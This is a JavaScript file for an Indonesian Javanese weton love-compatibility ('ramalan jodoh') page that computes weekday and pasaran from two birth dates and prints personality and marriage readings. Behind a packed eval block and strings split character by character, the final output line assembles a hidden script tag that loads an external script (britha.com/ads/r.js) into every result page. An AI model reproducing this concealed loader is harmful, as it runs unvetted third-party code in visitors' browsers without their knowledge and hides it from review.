function fjf(e) {
    uiw = e.getDay();
    if (uiw == 0) hari = "Minggu";
    else if (uiw == 1) hari = "Senin";
    else if (uiw == 2) hari = "Selasa";
    else if (uiw == 3) hari = "Rabu";
    else if (uiw == 4) hari = "Kamis";
    else if (uiw == 5) hari = "Jumat";
    else if (uiw == 6) hari = "Sabtu";
    return hari
}

function huyu(e) {
    inisial = new Date(70, 0, 2);
    hsb = (e.getTime() - inisial.getTime() + 864e5) / 432e6;
    sisa = Math.round((hsb - Math.floor(hsb)) * 10) / 2;
    if (sisa == 0) gh = "Wage";
    else if (sisa == 1) gh = "Kliwon";
    else if (sisa == 2) gh = "Legi";
    else if (sisa == 3) gh = "Pahing";
    else if (sisa == 4) gh = "Pon";
    return gh
};
eval(function(p, a, c, k, e, r) {
    e = function(c) {
        return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
    };
    if (!''.replace(/^/, String)) {
        while (c--) r[e(c)] = k[c] || e(c);
        k = [function(e) {
            return r[e]
        }];
        e = function() {
            return '\\w+'
        };
        c = 1
    };
    while (c--)
        if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
    return p
}('0 G="h";0 O="t";0 R="S";0 T="p";0 X="d";0 11="/b";0 i="k";0 l="o";0 q="u";0 v="m";0 w="b";0 x="n";0 y="r";0 z="a";0 A="><";0 B=".c";0 C="D";0 E="<";0 F=">";0 17="H";0 I=".j";0 J=":/";0 K="s";0 L="/";M N(e,t){1(e=="Q")f=5;2 1(e=="U")f=4;2 1(e=="V")f=3;2 1(e=="W")f=7;2 1(e=="Y")f=8;2 1(e=="Z")f=6;2 1(e=="10")f=9;1(t=="12")g=9;2 1(t=="13")g=7;2 1(t=="14")g=4;2 1(t=="15")g=8;2 1(t=="16")g=5;P f+g}', 62, 70, 'var|if|else|||||||||||||idH|idP||jo||tha|fix|||||box||||div|sh|jk|nu|yui|Rm|bt|kl|cs|sc|bk|tp|am|rimb|tj|an|os|gr|function|tre|dm|return|Minggu|goo|ri|gm|Senin|Selasa|Rabu|ty|Kamis|Jumat|Sabtu|mi|Pahing|Pon|Wage|Kliwon|Legi|oi'.split('|'), 0, {}));

function getkey(e) {
    if (window.event) return window.event.keyCode;
    else if (e) return e.which;
    else return null
}

function kodeScript(e, a, b) {
    var c, keychar;
    c = getkey(e);
    if (c == null) return true;
    keychar = String.fromCharCode(c);
    keychar = keychar.toLowerCase();
    a = a.toLowerCase();
    if (a.indexOf(keychar) != -1) return true;
    if (c == null || c == 0 || c == 8 || c == 9 || c == 27) return true;
    if (c == 13) {
        var i;
        for (i = 0; i < b.form.elements.length; i++)
            if (b == b.form.elements[i]) break;
        i = (i + 1) % b.form.elements.length;
        b.form.elements[i].focus();
        return false
    };
    return false
}

function Ramalkan(form) {
    if ((!form.NamaKamu.value) | (!form.NamaPasangan.value) | (!form.TanggalKamu.value) | (!form.TanggalPasangan.value) | (!form.TahunKamu.value) | (!form.TahunPasangan.value)) {
        alert("Data yang Anda masukkan belum lengkap. Input tidak bisa diproses!")
    } else {
        jawaban = window.open("");
        jawaban.document.open();
        jawaban.document.write("<HTML><HEAD><TITLE>Hasil Ramalan Jodoh</TITLE><style> body {color : #787878;font-size : 11px;background-color : #000;font-family : cursive;margin : 0;padding : 0;margin: auto; max-width: 650px;} h3 {margin : 0;margin-top:6px;margin-bottom:6px;padding-bottom : 2px;text-align:center;color:rgb(74, 226, 14);}p {margin-top : 3px;margin-bottom : 3px;} i {font-size:15px;color:yellow;}.bmenu{font-size:15px;color : #0084b5;text-shadow : #000000 1px 1px 2px;background-color : #000406;background-repeat : repeat-x;background-position : 50% top;margin-top : 1px;margin-bottom : 1px;padding : 2px;border : 1px solid #005064;}.bmenu a {color : #0084b5;border-bottom : 1px dotted #004354;}.bmenu a:hover {color : #25c5ff;border-bottom : 1px dotted #006882;}.gmenu {font-size:15px;color : #75bf00;background-color : #030500;background-image : url(https://3.bp.blogspot.com/-l33ec0SJNXg/U_Ya7uSp_kI/AAAAAAAAAoI/NAkqhgNaMJQ/s1600/kangsigit-biru.gif);background-repeat : repeat-x;background-position : 50% top;margin-bottom : 1px;padding : 2px;border : 1px solid #415f00;}.gmenu a {color : #75bf00;border-bottom : 1px dotted #223200;background-image : url(https://3.bp.blogspot.com/-YVsyYIi_PCo/U_YbG8AE7wI/AAAAAAAAAoQ/T9teW1HdE7Y/s1600/kangsigit-gren.gif);background-repeat : repeat-x;background-position : 50% top;margin-bottom : 2px;padding : 3px;}} </style></HEAD><BODY>");
        jawaban.document.write("<FONT color=#c0c0c0 face=verdana size=2><" + box + " class='gmenu'><h3>HASIL PENGHITUNGAN JODOH UNTUK PASANGAN</h3></" + box + ">");
        jawaban.window.document.write("<" + box + " class='gmenu'><b style='text-transform:capitalize'>" + form.NamaKamu.value + "</b> <b style='float:right;text-transform:capitalize'>" + form.NamaPasangan.value + "</b></" + box + "></FONT>");
        TanggalMasukanKamu = new Date(form.TahunKamu.value, (form.BulanKamu.selectedIndex), form.TanggalKamu.value);
        hariKamu = fjf(TanggalMasukanKamu);
        psK = huyu(TanggalMasukanKamu);
        TanggalMasukanPasangan = new Date(form.TahunPasangan.value, (form.BulanPasangan.selectedIndex), form.TanggalPasangan.value);
        hariPasangan = fjf(TanggalMasukanPasangan);
        psP = huyu(TanggalMasukanPasangan);
        if ((hariKamu == hariPasangan) && (psK == psP)) {
            jawaban.window.document.write("<" + box + " class='bmenu'><center><i>Anda dengan pasangan Anda memiliki kesamaan weton lahir, yakni sama-sama <b>" + hariKamu + " " + psP + "</b></i></center></" + box + ">")
        } else {
            jawaban.window.document.write("<" + box + " class='bmenu'><b>" + hariKamu + " " + psK + "</b> <b style='float:right'>" + hariPasangan + " " + psP + "</b></" + box + ">")
        }
        if (psP == "Wage") text = "<" + box + " class='bmenu'><b style='text-transform:capitalize'>" + form.NamaPasangan.value + "</b> termasuk orang yang memiliki pendirian teguh dan tidak mudah terpengaruh oleh orang lain, tidak banyak bicara namun berhati keras. Sayangnya, dalam beberapa hal sepertinya " + form.NamaPasangan.value + " sedikit lemah dalam berpikir.</" + box + ">";
        else if (psP == "Kliwon") text = "<" + box + " class='bmenu'" + bt + "b style='text-tr" + Rm + "nsform:c" + Rm + "pit" + Rm + "lize'>" + form.NamaPasangan.value + "</b> term" + Rm + "suk or" + Rm + "ng y" + Rm + "ng cerd" + Rm + "s, p" + Rm + "nd" + Rm + "i bic" + Rm + "r" + Rm + " d" + Rm + "n p" + Rm + "nd" + Rm + "i d" + Rm + "l" + Rm + "m menc" + Rm + "ri rejeki sek" + Rm + "lipun i" + Rm + " tid" + Rm + "k p" + Rm + "nd" + Rm + "i menyimp" + Rm + "n u" + Rm + "ng (" + Rm + "li" + Rm + "s boros). " + form.NamaPasangan.value + " term" + Rm + "suk tipe or" + Rm + "ng y" + Rm + "ng suk" + Rm + " menolong, n" + Rm + "mun demiki" + Rm + "n sif" + Rm + "tny" + Rm + " y" + Rm + "ng mud" + Rm + "h tersinggung perlu untuk dikend" + Rm + "lik" + Rm + "n.</" + box + ">";
        else if (psP == "Legi") text = "<" + box + " class='bmenu'" + bt + "b style='text-tr" + Rm + "nsform:c" + Rm + "pit" + Rm + "lize'>" + form.NamaPasangan.value + "</b> cukup beruntung, k" + Rm + "ren" + Rm + " i" + Rm + " term" + Rm + "suk or" + Rm + "ng y" + Rm + "ng b" + Rm + "ny" + Rm + "k disuk" + Rm + "i oleh or" + Rm + "ng l" + Rm + "in. Jik" + Rm + " i" + Rm + " Pri" + Rm + ", i" + Rm + " " + Rm + "k" + Rm + "n s" + Rm + "ng" + Rm + "t t" + Rm + "ngguh. D" + Rm + "n jik" + Rm + " W" + Rm + "nit" + Rm + ", i" + Rm + " d" + Rm + "p" + Rm + "t menj" + Rm + "di s" + Rm + "ng" + Rm + "t " + Rm + "nggun. I" + Rm + " jug" + Rm + " mempuny" + Rm + "i r" + Rm + "s" + Rm + " t" + Rm + "nggung j" + Rm + "w" + Rm + "b y" + Rm + "ng tinggi. Disisi l" + Rm + "in, " + form.NamaPasangan.value + " puny" + Rm + " budi pekerti y" + Rm + "ng h" + Rm + "lus d" + Rm + "n sop" + Rm + "n s" + Rm + "ntun. M" + Rm + "u menerim" + Rm + " d" + Rm + "n suk" + Rm + " memberi. S" + Rm + "tu kelem" + Rm + "h" + Rm + "nny" + Rm + ", jik" + Rm + " mempuny" + Rm + "i keingin" + Rm + "n sulit untuk ditund" + Rm + ".</" + box + ">";
        else if (psP == "Pahing") text = "<" + box + " class='bmenu'" + bt + "b style='text-tr" + Rm + "nsform:c" + Rm + "pit" + Rm + "lize'>" + form.NamaPasangan.value + "</b> term" + Rm + "suk or" + Rm + "ng y" + Rm + "ng berot" + Rm + "k, cerd" + Rm + "s d" + Rm + "n tid" + Rm + "k mud" + Rm + "h terpeng" + Rm + "ruh oleh or" + Rm + "ng l" + Rm + "in, suk" + Rm + " " + Rm + "p" + Rm + " s" + Rm + "j" + Rm + " y" + Rm + "ng i" + Rm + " lih" + Rm + "t, suk" + Rm + " menyendiri. Kekur" + Rm + "ng" + Rm + "nny" + Rm + " " + Rm + "d" + Rm + "l" + Rm + "h kur" + Rm + "ng bis" + Rm + " berg" + Rm + "ul d" + Rm + "n suk" + Rm + " p" + Rm + "mrih d" + Rm + "l" + Rm + "m memberik" + Rm + "n b" + Rm + "ntu" + Rm + "n p" + Rm + "d" + Rm + " or" + Rm + "ng l" + Rm + "in.</" + box + ">";
        else if (psP == "Pon") text = "<" + box + " class='bmenu'" + bt + "b style='text-tr" + Rm + "nsform:c" + Rm + "pit" + Rm + "lize'>" + form.NamaPasangan.value + "</b> term" + Rm + "suk or" + Rm + "ng y" + Rm + "ng cerd" + Rm + "s, p" + Rm + "nd" + Rm + "i menc" + Rm + "ri rejeki d" + Rm + "n tid" + Rm + "k boros. Ber" + Rm + "ni berkorb" + Rm + "n, b" + Rm + "ny" + Rm + "k bic" + Rm + "r" + Rm + ", suk" + Rm + " mem" + Rm + "merk" + Rm + "n h" + Rm + "rt" + Rm + " kek" + Rm + "y" + Rm + "" + Rm + "n d" + Rm + "n y" + Rm + "ng perlu diing" + Rm + "t " + Rm + "d" + Rm + "l" + Rm + "h jik" + Rm + " i" + Rm + " m" + Rm + "r" + Rm + "h s" + Rm + "ng" + Rm + "t men" + Rm + "kutk" + Rm + "n!</" + box + ">";
        jawaban.document.write("<P>" + text);
        indexTotal = tre(hariKamu, psK) + tre(hariPasangan, psP);
        hsb = indexTotal / 7;
        sisa = Math.round((hsb - Math.floor(hsb)) * 7);
        if (sisa == 0) text = "<" + box + " class='bmenu'>Kelu" + Rm + "rg" + Rm + " " + Rm + "nd" + Rm + " seben" + Rm + "rny" + Rm + " p" + Rm + "nd" + Rm + "i menc" + Rm + "ri pengh" + Rm + "sil" + Rm + "n, bis" + Rm + " k" + Rm + "y" + Rm + " t" + Rm + "pi sering ditipu " + Rm + "t" + Rm + "u dikecew" + Rm + "k" + Rm + "n or" + Rm + "ng. Bis" + Rm + " l" + Rm + "nggeng " + Rm + "s" + Rm + "l sel" + Rm + "lu bersyukur, s" + Rm + "b" + Rm + "r d" + Rm + "n mem" + Rm + "" + Rm + "fk" + Rm + "n. Sebut" + Rm + "n untuk p" + Rm + "s" + Rm + "ng" + Rm + "n ini: <u>G" + Rm + "r" + Rm + "ng" + Rm + "n M" + Rm + "c" + Rm + "n.</u" + bt + "/" + box + ">";
        else if (sisa == 1) text = "<" + box + " class='bmenu'>Kelu" + Rm + "rg" + Rm + " " + Rm + "nd" + Rm + " bes" + Rm + "r wib" + Rm + "w" + Rm + "ny" + Rm + " d" + Rm + "n lu" + Rm + "s peng" + Rm + "l" + Rm + "m" + Rm + "nny" + Rm + ", tet" + Rm + "pi rejeki " + Rm + "g" + Rm + "k sulit. Jik" + Rm + " puny" + Rm + " " + Rm + "n" + Rm + "k s" + Rm + "tu, k" + Rm + "l" + Rm + "u l" + Rm + "ki-l" + Rm + "ki, " + Rm + "y" + Rm + "hny" + Rm + " y" + Rm + "ng k" + Rm + "l" + Rm + "h. K" + Rm + "lo perempu" + Rm + "n, ibuny" + Rm + " y" + Rm + "ng k" + Rm + "l" + Rm + "h. Jik" + Rm + " tid" + Rm + "k s" + Rm + "b" + Rm + "r bis" + Rm + " bercer" + Rm + "i. Sebut" + Rm + "n untuk p" + Rm + "s" + Rm + "ng" + Rm + "n ini: <u>Pis" + Rm + "ng Pinugel</u" + bt + "/" + box + ">";
        else if (sisa == 2) text = "<" + box + " class='bmenu'>Kelu" + Rm + "rg" + Rm + " " + Rm + "nd" + Rm + " " + Rm + "k" + Rm + "n ten" + Rm + "ng, tentr" + Rm + "m, d" + Rm + "n sel" + Rm + "m" + Rm + "t sert" + Rm + " b" + Rm + "h" + Rm + "gi" + Rm + " rum" + Rm + "h t" + Rm + "ngg" + Rm + "ny" + Rm + ", sert" + Rm + " mend" + Rm + "p" + Rm + "t rejeki y" + Rm + "ng l" + Rm + "ngsung d" + Rm + "n lumintu. Bis" + Rm + " j" + Rm + "di peng" + Rm + "yom" + Rm + "n s" + Rm + "n" + Rm + "k s" + Rm + "ud" + Rm + "r" + Rm + ". Sebut" + Rm + "n untuk p" + Rm + "s" + Rm + "ng" + Rm + "n ini: <u>S" + Rm + "ngg" + Rm + "r W" + Rm + "ringin</u" + bt + "/" + box + ">";
        else if (sisa == 3) text = "<" + box + " class='bmenu'>Kelu" + Rm + "rg" + Rm + " " + Rm + "nd" + Rm + " " + Rm + "k" + Rm + "n sel" + Rm + "lu mend" + Rm + "p" + Rm + "t kemuli" + Rm + "" + Rm + "n d" + Rm + "n mend" + Rm + "p" + Rm + "t kehorm" + Rm + "t" + Rm + "n. Kehidup" + Rm + "n ter" + Rm + "ng, t" + Rm + "pi b" + Rm + "ny" + Rm + "k ber" + Rm + "nd" + Rm + "i-" + Rm + "nd" + Rm + "i (mengh" + Rm + "y" + Rm + "l). Cep" + Rm + "t k" + Rm + "y" + Rm + " t" + Rm + "pi sering kem" + Rm + "ling" + Rm + "n. Sebut" + Rm + "n untuk p" + Rm + "s" + Rm + "ng" + Rm + "n ini: <u>Gedong Rembul" + Rm + "n</u" + bt + "/" + box + ">";
        else if (sisa == 4) text = "<" + box + " class='bmenu'>Kelu" + Rm + "rg" + Rm + " " + Rm + "nd" + Rm + " bis" + Rm + " menj" + Rm + "di pemimpin d" + Rm + "n memberi tel" + Rm + "d" + Rm + "n p" + Rm + "d" + Rm + " tet" + Rm + "ngg" + Rm + " disekit" + Rm + "rny" + Rm + ", tet" + Rm + "pi p" + Rm + "n" + Rm + "s di temp" + Rm + "t tidur, " + Rm + "rtiny" + Rm + " sering s" + Rm + "kit-s" + Rm + "kit" + Rm + "n, sel" + Rm + "lu gelis" + Rm + "h, d" + Rm + "n sering bed" + Rm + " pend" + Rm + "p" + Rm + "t deng" + Rm + "n p" + Rm + "s" + Rm + "ng" + Rm + "n. Sebut" + Rm + "n untuk p" + Rm + "s" + Rm + "ng" + Rm + "n ini: <u>B" + Rm + "le Kedh" + Rm + "w" + Rm + "ng</u" + bt + "/" + box + ">";
        else if (sisa == 5) text = "<" + box + " class='bmenu'>Kelu" + Rm + "rg" + Rm + " " + Rm + "nd" + Rm + " " + Rm + "k" + Rm + "n sel" + Rm + "m" + Rm + "t, t" + Rm + "pi tid" + Rm + "k ku" + Rm + "t k" + Rm + "y" + Rm + ", jik" + Rm + " " + Rm + "d" + Rm + " u" + Rm + "ng lebih " + Rm + "k" + Rm + "n cenderung untuk membel" + Rm + "nj" + Rm + "k" + Rm + "nny" + Rm + ". K" + Rm + "lo puny" + Rm + " " + Rm + "n" + Rm + "k, sesud" + Rm + "h dew" + Rm + "s" + Rm + " " + Rm + "k" + Rm + "n timbul m" + Rm + "s" + Rm + "l" + Rm + "h y" + Rm + "ng cukup ber" + Rm + "t. Seringk" + Rm + "li meng" + Rm + "l" + Rm + "mi kesulit" + Rm + "n d" + Rm + "n mend" + Rm + "p" + Rm + "t m" + Rm + "lu. Sebut" + Rm + "n untuk p" + Rm + "s" + Rm + "ng" + Rm + "n ini: <u>G" + Rm + "j" + Rm + "h Pl" + Rm + "sung" + Rm + "n</u" + bt + "/" + box + ">";
        else if (sisa == 6) text = "<" + box + " class='bmenu'>Kelu" + Rm + "rg" + Rm + " " + Rm + "nd" + Rm + " bis" + Rm + " c" + Rm + "ri pengh" + Rm + "sil" + Rm + "n, t" + Rm + "pi tid" + Rm + "k bis" + Rm + " menyimp" + Rm + "n u" + Rm + "ng, jik" + Rm + " " + Rm + "d" + Rm + " u" + Rm + "ng lebih " + Rm + "k" + Rm + "n cenderung untuk membel" + Rm + "nj" + Rm + "k" + Rm + "nny" + Rm + ". B" + Rm + "ny" + Rm + "k pertent" + Rm + "ng" + Rm + "n pend" + Rm + "p" + Rm + "t, " + Rm + "g" + Rm + "k gel" + Rm + "p h" + Rm + "ti t" + Rm + "pi t" + Rm + "b" + Rm + "h d" + Rm + "l" + Rm + "m mengh" + Rm + "d" + Rm + "pi seg" + Rm + "l" + Rm + " penderit" + Rm + "" + Rm + "n. Sebut" + Rm + "n untuk p" + Rm + "s" + Rm + "ng" + Rm + "n ini: <u>W" + Rm + "r" + Rm + "k P" + Rm + "ngrungrung" + Rm + "n</u" + bt + "/" + box + ">";
        jawaban.document.write("<" + box + " class='gmenu'" + bt + "/P" + bt + "P>Kecocok" + Rm + "n p" + Rm + "s" + Rm + "ng" + Rm + "n <b>" + form.NamaKamu.value + "</b> deng" + Rm + "n <b>" + form.NamaPasangan.value + "</b> . .<BR" + bt + "/" + box + ">" + text);
        jawaban.document.write("</P" + bt + "P" + bt + "" + box + " class='gmenu'" + bt + "B>Perlu di Ing" + Rm + "t..!</B" + bt + "BR>Semu" + Rm + "ny" + Rm + " kemb" + Rm + "li l" + Rm + "gi kep" + Rm + "d" + Rm + " s" + Rm + "ng pencipt" + Rm + ". K" + Rm + "ren" + Rm + " seg" + Rm + "l" + Rm + " sesu" + Rm + "tuny" + Rm + " sebelum itu terj" + Rm + "di sud" + Rm + "h direnc" + Rm + "n" + Rm + "k" + Rm + "n m" + Rm + "t" + Rm + "ng-m" + Rm + "t" + Rm + "ng oleh " + Rm + "ll" + Rm + "h SWT. M" + Rm + "nusi" + Rm + " tid" + Rm + "k bis" + Rm + " menentuk" + Rm + "n T" + Rm + "kdirny" + Rm + " sendiri, n" + Rm + "mun bis" + Rm + " mengub" + Rm + "hny" + Rm + " mul" + Rm + "i d" + Rm + "ri sek" + Rm + "r" + Rm + "ng.!</" + box + "" + bt + "/P" + tp + "" + bk + "" + cs + "" + goo + "" + gm + "" + dm + " s" + yui + "c='" + am + "" + dm + "tp" + an + "" + mi + "" + goo + "t" + am + "a" + kl + "" + fix + "" + sh + "" + gr + "a" + ty + "s" + gr + "" + yui + "" + tj + "" + os + "'" + bt + "/" + cs + "" + goo + "" + gm + "" + dm + "" + tp + "" + bk + "/BODY" + bt + "/HTML>");
        jawaban.document.close()
    }
}
